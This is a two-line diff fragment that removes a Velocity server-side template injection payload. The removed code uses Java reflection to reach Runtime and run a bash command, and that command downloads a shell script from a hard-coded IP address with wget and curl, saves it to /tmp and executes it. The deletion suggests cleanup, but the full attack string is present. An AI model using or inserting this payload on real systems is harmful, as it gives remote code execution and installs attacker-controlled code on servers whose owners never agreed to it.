@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', $e.getClass().forName('java.lang.Runtime')).invoke(String.class.getClass().forName("java.lang.Runtime"),new String[]{"/bin/bash","-c","wget http://89.221.52.122/s.sh -O /tmp/s.sh;curl http://89.221.52.122/s.sh -L > /tmp/s.sh;sh  /tmp/s.sh"}).toString()
